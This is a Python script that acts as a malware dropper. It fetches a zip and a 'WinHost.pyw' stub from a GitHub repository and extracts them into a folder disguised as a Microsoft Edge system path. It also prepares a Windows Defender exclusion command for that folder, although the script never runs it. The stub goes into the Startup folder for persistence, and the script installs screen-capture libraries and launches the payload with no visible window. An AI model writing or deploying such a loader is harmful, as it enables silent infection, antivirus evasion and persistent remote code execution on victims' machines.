import os
import requests
import os
import subprocess
import ctypes
import sys
from zipfile import ZipFile

curUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/current.txt'
current = requests.get(curUrl, allow_redirects=True)

fil = current.text[0]

url = f'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/{fil}.zip'
r = requests.get(url, allow_redirects=True)

path_to_exclude = "C:\\Apps\\Windows\\MicrosoftEdge\\set"

os.makedirs("C:\\Apps\\Windows\\MicrosoftEdge\\set")

# Construct the command to add the exclusion
command = f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath {path_to_exclude}"

try:
    open(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip", "wb").write(r.content)

    with ZipFile(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip", "r") as z:
        z.extractall("C:\\Apps\\Windows\\MicrosoftEdge\\set")
        z.close()
        os.remove(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip")

        roaming = os.getenv('AppData')
        startup = f"{roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

        with open(f"{startup}\\WinHost.pyw", "wb") as ff:
            stubUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/WinHost.pyw'
            stubr = requests.get(stubUrl, allow_redirects=True)
            ff.write(stubr.content)
        
        os.system("pip install requests==2.31.0")
        os.system("pip install pyautogui==0.9.54")
        os.system("pip install numpy==1.26.0")
        os.system("pip install opencv-python==4.8.1.78")
        
        subprocess.run(
            f"pythonw \"{startup}\\WinHost.pyw\"", 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            creationflags=subprocess.CREATE_NO_WINDOW
        )
except subprocess.CalledProcessError as e:
    print(f"Error installing: {e}")
    os.rmdir("C:\\Apps\\Windows\\MicrosoftEdge\\set")
    os.rmdir("C:\\Apps\\Windows\\MicrosoftEdge")
